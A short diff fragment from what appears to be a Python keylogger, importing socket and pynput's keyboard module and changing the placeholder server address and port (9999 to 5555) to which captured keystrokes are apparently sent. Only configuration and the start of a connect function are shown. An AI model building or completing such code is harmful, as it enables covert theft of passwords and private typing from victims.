@@ -2,8 +2,8 @@ import socket
 from pynput import keyboard
 
 # Server IP and Port (Change to your server's IP and port)
-SERVER_IP = 'YOUR IP/NO-IP ADDRESS'  # Your server's IP
-SERVER_PORT = 9999            # Server port
+SERVER_IP = 'YOUR IP ADDRESS'  # Your server's IP
+SERVER_PORT = 5555           # Server port
 
 # Set up the socket connection to the server
 def connect_to_server():
